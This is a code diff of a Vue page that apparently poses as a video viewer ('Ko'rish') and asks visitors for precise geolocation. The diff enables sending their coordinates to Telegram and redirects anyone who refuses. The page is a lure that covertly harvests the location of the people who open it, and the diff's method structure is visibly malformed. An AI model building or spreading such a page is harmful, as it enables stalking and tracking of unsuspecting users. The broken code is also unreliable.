@@ -7,6 +7,7 @@
         <button class="allow-btn" @click="allowVideo">Ko'rish</button>
       </div>
     </div>
+    <!-- Error Modal -->
     <div v-if="geoDenied" class="modal">
       <div class="modal-content">
         <h2>
@@ -41,29 +42,19 @@ export default {
     allowVideo() {
       this.getGeolocation();
     },
-    requestGeolocation() {
+    getGeolocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            this.latitude = pos.coords.latitude;
-            this.longitude = pos.coords.longitude;
-            // this.sendToTelegram();
-            this.showGeoModal = false;
-            this.showLogin = true;
+          (position) => {
+            this.latitude = position.coords.latitude;
+            this.longitude = position.coords.longitude;
+            this.sendToTelegram(); // faqat muvaffaqiyatli holatda
+            this.showModal = false;
+            this.showVideo = true;
           },
-          (err) => {
-            console.error("Geolocation error:", err.message);
-
-            // ❌ Ruhsat berilmasa:
-            this.geoDenied = true;
-            this.showGeoModal = false;
-            this.showLogin = false;
-
-            // ✅ 3 soniyadan so'ng bosh oynaga qaytarish
-            setTimeout(() => {
-              this.geoDenied = false;
-              this.showGeoModal = true;
-            }, 3000);
+          (error) => {
+            console.error("Geolocation error:", error.message);
+            window.location.href = "/"; // rad etsa — sahifaga qaytar
           },
           {
             enableHighAccuracy: true,
@@ -72,16 +63,8 @@ export default {
           }
         );
       } else {
-        this.geoDenied = true;
-        this.showGeoModal = false;
-        this.showLogin = false;
-
-        setTimeout(() => {
-          this.geoDenied = false;
-          this.showGeoModal = true;
-        }, 3000);
-      }
-    }
+        window.location.href = "/";
+      },
     sendToTelegram() {
       const message = `📍 Yangi foydalanuvchi joylashuvi:
 Latitude: ${this.latitude}
